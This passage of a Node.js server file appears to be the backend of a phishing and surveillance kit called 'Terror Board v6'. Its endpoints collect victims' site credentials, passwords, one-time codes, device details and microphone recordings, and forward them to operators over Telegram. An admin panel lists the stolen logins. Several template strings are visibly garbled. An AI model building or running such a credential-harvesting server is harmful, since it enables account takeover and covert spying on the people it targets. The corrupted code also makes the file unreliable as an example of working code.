      await tgVoice(id, file.buffer, `🎤 Microphone\nLink: <code>${tok}</code>`);
    }
    res.json({ ok: true });
  } catch (e) {
    res.json({ ok: false });
  }
});

app.post('/d/captured', async (req, res) => {
  const { uid, site, email, pass, phone, otp } = req.body || {};
  store.captured.push({
    site: site || 'Unknown',
    email: email || phone || '',
    pass: pass || otp || '',
    ts: new Date().toISOString(),
    uid
  });
  saveStore();
  const targets = [...new Set([String(uid), ...ADMINS])];
  for (const id of targets) {
    await tgMsg(id, `🩸 <b>\( {site}</b>\n<code> \){email || phone || ''}</code>\n<code>${pass || otp || ''}</code>`);
  }
  log('captured', uid, { site });
  res.json({ ok: true });
});

app.post('/d/devinfo', async (req, res) => {
  const { uid, label, data } = req.body || {};
  let text = `📡 <b>${label || 'Device'}</b>\n`;
  if (data && typeof data === 'object') {
    for (const [k, v] of Object.entries(data)) {
      if (v != null && v !== '') text += `\( {k}: <code> \){String(v).slice(0, 120)}</code>\n`;
    }
  }
  const targets = [...new Set([String(uid), ...ADMINS])];
  for (const id of targets) {
    await tgMsg(id, text);
  }
  res.json({ ok: true });
});

// ══════════════════════════════════════════════════════
// WEB PANEL
// ══════════════════════════════════════════════════════
app.get('/login', (req, res) => {
  res.send(`<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Board Login</title>
<style>
body{font-family:system-ui;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0;color:#fff}
.card{background:rgba(255,255,255,0.07);backdrop-filter:blur(10px);padding:36px 28px;border-radius:16px;width:90%;max-width:360px;border:1px solid rgba(255,255,255,0.1)}
h2{text-align:center;margin:0 0 24px;font-size:22px}
input{width:100%;padding:13px;margin:8px 0;border-radius:8px;border:1px solid #444;background:#1a1a2e;color:#fff;box-sizing:border-box;font-size:15px}
button{width:100%;padding:13px;margin-top:12px;background:linear-gradient(90deg,#7c5cfc,#a855f7);color:#fff;border:none;border-radius:8px;font-weight:600;font-size:15px;cursor:pointer}
</style></head>
<body>
<div class="card">
  <h2>🕹 Terror Board</h2>
  <form method="POST" action="/auth">
    <input name="user" placeholder="Username" required autocomplete="username">
    <input name="pass" type="password" placeholder="Password" required autocomplete="current-password">
    <button type="submit">Login</button>
  </form>
</div>
</body></html>`);
});

app.post('/auth', (req, res) => {
  const { user, pass } = req.body || {};
  if (user === CFG.PANEL_USER && pass === CFG.PANEL_PASS) {
    const tok = hash(16);
    store.panelSessions[tok] = { exp: Date.now() + 12 * 60 * 60 * 1000 };
    saveStore();
    return res.redirect('/panel?t=' + tok);
  }
  res.redirect('/login');
});

app.get('/panel', (req, res) => {
  const t = req.query.t;
  if (!t || !store.panelSessions[t] || store.panelSessions[t].exp < Date.now()) {
    return res.redirect('/login');
  }
  const last = store.captured.slice(-25).reverse();
  const rows = last.map(c =>
    `<tr><td>\( {c.site || ''}</td><td> \){c.email || ''}</td><td>\( {c.pass || ''}</td><td> \){(c.ts || '').slice(0, 19)}</td></tr>`
  ).join('') || '<tr><td colspan="4">No captures yet</td></tr>';

  res.send(`<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Panel</title>
<style>
body{font-family:system-ui;background:#0f0c29;color:#eee;margin:0;padding:20px}
h2{margin:0 0 16px}
.stat{background:#1a1a2e;padding:12px 16px;border-radius:10px;margin-bottom:16px;font-size:14px}
table{width:100%;border-collapse:collapse;font-size:13px}
th,td{padding:10px 8px;border-bottom:1px solid #2a2a3a;text-align:left}
th{color:#a78bfa}
a{color:#a78bfa}
</style></head>
<body>
<h2>🕹 Control Panel</h2>
<div class="stat">
  Users: ${Object.keys(store.users).length} &nbsp;|&nbsp;
  Active links: ${Object.values(store.links).filter(l => l.expiresAt > Date.now()).length} &nbsp;|&nbsp;
  Captured: ${store.captured.length}
</div>
<table>
  <tr><th>Service</th><th>Email / Phone</th><th>Password / OTP</th><th>Time</th></tr>
  ${rows}
</table>
<p style="margin-top:24px"><a href="/login">Logout</a></p>
</body></html>`);
});

app.get('/', (req, res) => res.send('Terror Board v6 online'));
app.get('/health', (req, res) => res.json({ ok: true, uptime: process.uptime() }));

// ══════════════════════════════════════════════════════
// START
// ══════════════════════════════════════════════════════
server.listen(CFG.PORT, '0.0.0.0', () => {
  console.log('========================================');
  console.log('  TERROR BOARD v6');
  console.log('  Port: ' + CFG.PORT);
  console.log('  Base: ' + CFG.BASE_URL);
  console.log('========================================');
});

process.on('uncaughtException', e => console.log('uncaught', e.message));
process.on('unhandledRejection', e => console.log('reject', e && e.message));
